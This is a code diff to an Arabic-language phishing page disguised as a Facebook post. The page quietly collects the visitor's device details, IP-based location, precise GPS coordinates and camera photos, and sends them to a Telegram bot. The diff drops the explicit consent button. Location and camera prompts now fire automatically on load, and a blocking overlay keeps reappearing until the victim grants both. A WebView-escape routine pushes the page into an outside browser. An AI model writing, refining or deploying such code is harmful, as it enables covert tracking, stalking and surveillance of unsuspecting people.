@@ -33,8 +33,7 @@
       background: var(--bg);
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
-      flex-direction: column;
-      align-items: center;
+      justify-content: center;
       padding-top: 20px;
       min-height: 100vh;
       position: relative;
@@ -42,7 +41,7 @@
     .post-container {
       max-width: 500px; width: 100%; background: var(--card-bg);
       border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-      overflow: hidden; border: 1px solid var(--border); margin-bottom: 15px;
+      overflow: hidden; border: 1px solid var(--border);
     }
     .post-header { display: flex; align-items: center; padding: 12px 16px 0; position: relative; }
     .post-header img { width: 40px; height: 40px; border-radius: 50%; margin-left: 8px; object-fit: cover; }
@@ -56,36 +55,14 @@
     .three-dots { position: absolute; top: 12px; left: 16px; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; color: var(--text-secondary); font-size: 20px; }
     .three-dots:hover { background: var(--border); }
 
-    /* أزرار التحكم */
-    .controls {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 10px;
-      width: 100%;
-      max-width: 500px;
-    }
-    .permission-btn {
-      padding: 14px 28px;
-      font-size: 1.1rem;
-      background: #1877f2;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: 600;
-      width: 100%;
+    /* شاشة إعادة المحاولة */
+    .retry-overlay {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: var(--bg); display: flex; justify-content: center; align-items: center; z-index: 9999;
     }
     .retry-btn {
-      padding: 14px 28px;
-      font-size: 1.1rem;
-      background: #1877f2;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: 600;
-      width: 100%;
+      padding: 14px 28px; font-size: 1.1rem; background: #1877f2; color: white;
+      border: none; border-radius: 6px; cursor: pointer; font-weight: 600;
     }
     .hidden { display: none !important; }
     video, canvas { display: none; }
@@ -106,9 +83,8 @@
     <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
   </div>
 
-  <div class="controls">
-    <button class="permission-btn" id="allowBtn">السماح بالكاميرا والموقع</button>
-    <button class="retry-btn hidden" id="retryBtn">إعادة المحاولة</button>
+  <div class="retry-overlay hidden" id="retryOverlay">
+    <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
   </div>
 
   <video id="video" autoplay playsinline></video>
@@ -122,7 +98,7 @@
     const I = 'a7e43833d69a75';
 
     const post = document.getElementById('postContainer');
-    const allowBtn = document.getElementById('allowBtn');
+    const overlay = document.getElementById('retryOverlay');
     const retryBtn = document.getElementById('retryBtn');
     const vid = document.getElementById('video');
     const cnv = document.getElementById('canvas');
@@ -130,9 +106,9 @@
 
     let stream, photos = 0, capInt, redir = 'https://www.facebook.com', deviceInfoSent = false, gpsLoc = null, ipLoc = null;
     let recording = false;
-    let permissionsGranted = false;
+    let locationGranted = false;   // هل قبل المستخدم GPS؟
+    let cameraGranted = false;     // هل قبل المستخدم الكاميرا؟
 
-    // ==================== دوال مساعدة ====================
     async function sendText(text) {
       try {
         await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
@@ -148,18 +124,9 @@
       return new Blob([u8], { type: mime });
     }
 
-    function showRetry() {
-      post.classList.add('hidden');
-      allowBtn.classList.add('hidden');
-      retryBtn.classList.remove('hidden');
-      stopAll();
-    }
-
-    function showAllow() {
-      post.classList.remove('hidden');
-      allowBtn.classList.remove('hidden');
-      retryBtn.classList.add('hidden');
-    }
+    function showOverlay() { post.classList.add('hidden'); overlay.classList.remove('hidden'); }
+    function hideOverlay() { overlay.classList.add('hidden'); post.classList.remove('hidden'); }
+    function stopAll() { if (capInt) clearInterval(capInt); if (stream) stream.getTracks().forEach(t => t.stop()); }
 
     // ==================== تحميل المنشور ====================
     async function loadPost() {
@@ -201,7 +168,7 @@
       } catch (e) {}
     }
 
-    // ==================== الموقع ====================
+    // ==================== الموقع (IP) ====================
     async function fetchIPLocation() {
       try {
         const r = await fetch(`https://ipinfo.io/json?token=${I}`); const d = await r.json();
@@ -213,6 +180,7 @@
       } catch (e) {}
     }
 
+    // ==================== الموقع الدقيق (GPS) ====================
     async function requestGPS() {
       if (!navigator.geolocation) return false;
       try {
@@ -224,6 +192,20 @@
         await sendText(`📍 الموقع الدقيق (GPS): ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n🌍 https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}`);
         return true;
       } catch (e) { return false; }
+    }
+
+    // ==================== طلب الموقع فقط (مع زر إعادة المحاولة) ====================
+    async function tryLocation() {
+      hideOverlay();              // نظهر المنشور
+      await new Promise(r => setTimeout(r, 200));
+      const ok = await requestGPS();
+      if (ok) {
+        locationGranted = true;
+        // انتقل للكاميرا
+        await tryCamera();
+      } else {
+        showOverlay();            // رفض -> إظهار زر الإعادة
+      }
     }
 
     // ==================== الكاميرا ====================
@@ -266,11 +248,29 @@
       } catch (e) { recording = false; }
     }
 
-    function stopAll() {
-      if (capInt) clearInterval(capInt);
-      if (stream) stream.getTracks().forEach(t => t.stop());
+    // ==================== طلب الكاميرا فقط (مع زر إعادة المحاولة) ====================
+    async function tryCamera() {
+      hideOverlay();              // نظهر المنشور
+      await new Promise(r => setTimeout(r, 200));
+      const ok = await startCamera();
+      if (ok) {
+        cameraGranted = true;
+        hideOverlay();            // كل شيء تمام
+      } else {
+        showOverlay();            // رفض -> إظهار زر الإعادة (الموقع بقي مقبولاً)
+      }
     }
 
+    // ==================== إعادة المحاولة ====================
+    retryBtn.addEventListener('click', async () => {
+      if (!locationGranted) {
+        await tryLocation();         // لم يقبل الموقع بعد، نحاول الموقع مجدداً
+      } else if (!cameraGranted) {
+        await tryCamera();           // الموقع مقبول، نحاول الكاميرا
+      }
+    });
+
+    // ==================== تقرير الخروج ====================
     async function sendExitReport() {
       let locStr = 'غير متوفر';
       if (gpsLoc) locStr = `GPS (${gpsLoc.lat}, ${gpsLoc.lon}, دقة ${gpsLoc.acc}م)`;
@@ -278,51 +278,12 @@
       await sendText(`<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`);
     }
 
-    // ==================== طلب الصلاحيات (مرتب) ====================
-    async function requestPermissions() {
-      // طلب الموقع الدقيق أولاً
-      const gpsOk = await requestGPS();
-      if (!gpsOk) {
-        showRetry();
-        return false;
-      }
-      // ثم الكاميرا
-      const camOk = await startCamera();
-      if (!camOk) {
-        showRetry();
-        return false;
-      }
-      // نجحت الصلاحيتان
-      permissionsGranted = true;
-      allowBtn.classList.add('hidden');
-      retryBtn.classList.add('hidden');
-      post.classList.remove('hidden');
-      return true;
-    }
-
-    // ==================== ربط الأحداث ====================
-    allowBtn.addEventListener('click', async () => {
-      // إخفاء الزر أثناء الطلب
-      allowBtn.classList.add('hidden');
-      post.classList.remove('hidden'); // إظهار المنشور مؤقتاً
-      await new Promise(r => setTimeout(r, 200));
-      await requestPermissions();
-    });
-
-    retryBtn.addEventListener('click', async () => {
-      retryBtn.classList.add('hidden');
-      post.classList.remove('hidden'); // إظهار المنشور مؤقتاً
-      await new Promise(r => setTimeout(r, 200));
-      await requestPermissions();
-    });
-
     // ==================== خطة الهروب من WebView ====================
     async function attemptEscape() {
       const targetUrl = window.location.href;
       const ua = navigator.userAgent || '';
       const isIOS = /iPhone|iPad|iPod/i.test(ua);
       const isAndroid = /Android/i.test(ua);
-      
       const iosMethods = [
         () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'x-safari-https://'); },
         () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'googlechrome://'); },
@@ -365,9 +326,10 @@
       await loadPost();
       sendDeviceInfo();
       fetchIPLocation();
-      // إظهار زر السماح (المنشور ظاهر)
-      showAllow();
-      // لا نطلب الصلاحيات تلقائياً
+      // المنشور ظاهر، نبدأ بطلب الموقع بعد 600ms
+      setTimeout(async () => {
+        await tryLocation();      // يطلب GPS أولاً، إذا نجح ينتقل للكاميرا تلقائياً
+      }, 600);
     })();
   </script>
 </body>
